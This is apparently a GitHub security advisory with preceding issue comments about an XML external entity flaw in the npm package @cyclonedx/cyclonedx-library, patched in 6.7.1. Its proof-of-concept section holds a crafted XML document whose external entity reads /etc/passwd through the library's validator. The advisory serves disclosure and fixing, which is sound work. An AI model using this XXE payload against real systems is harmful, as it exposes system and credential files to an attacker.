Instead, it crashes, since the XXE is not parsable nor executed. This behavior is acceptable.  I consider this a fix. The vulnerability of [#1061](https://github.com/CycloneDX/cyclonedx-javascript-library/issues/1061) is not usable anymore.  Therefore: fixes [#1061](https://github.com/CycloneDX/cyclonedx-javascript-library/issues/1061) |

| Great work [@jkowalleck](https://github.com/jkowalleck)! I found this when I was researching on how to prevent the parsing vulnerabilities following up on [CVE-2024-34393](https://github.com/advisories/GHSA-mjr4-7xg5-pfvh). This looks great and I agree that the `nonet` and `noent` options should solve the vulnerabilities. I was wondering the reason behind adding the `compact` option. Was it only for the performance improvements for your specific use case or can it also prevent some kind of vulnerability? According to the official documentation, all it does is:  Compact small text nodes; no modification of the tree allowed afterwards (will possibly crash if you try to modify the tree) |

| yes, the `compact` was added for my specific purposes, it is not related to the actual workaround for the thing.  LIBXML\_COMPACT: Activate small nodes allocation optimization. This may speed up your application without needing to change the code. Note: Only available in Libxml >= 2.6.21 |

# Improper Restriction of XML External Entity Reference in @cyclonedx/cyclonedx-library

High

[jkowalleck](/jkowalleck)
published
GHSA-38gf-rh2w-gmj7
May 8, 2024

## Package

npm

@cyclonedx/cyclonedx-library
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

6.7.0

## Patched versions

6.7.1

## Description

### Impact

XML External entity injections could be possible, when running the provided XML Validator on arbitrary input.

#### POC

```
const {
  Spec: { Version },
  Validation: { XmlValidator }
} = require('@cyclonedx/cyclonedx-library');

const version = Version.v1dot5;
const validator = new XmlValidator(version);
const input = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE poc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<bom xmlns="http://cyclonedx.org/schema/bom/1.5">
  <components>
    <component type="library">
      <name>testing</name>
      <version>1.337</version>
      <licenses>
        <license>
          <id>&xxe;</id><!-- << XML external entity (XXE) injection -->
        </license>
      </licenses>
    </component>
  </components>
</bom>`;

// validating this forged(^) input might lead to unintended behaviour
// for the fact that the XML external entity would be taken into account.
validator.validate(input).then(ve => {
  console.error('validation error', ve);
});
```
### Patches

This issue was fixed in `@cyclonedx/cyclonedx-library@6.7.1` .

### Workarounds

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
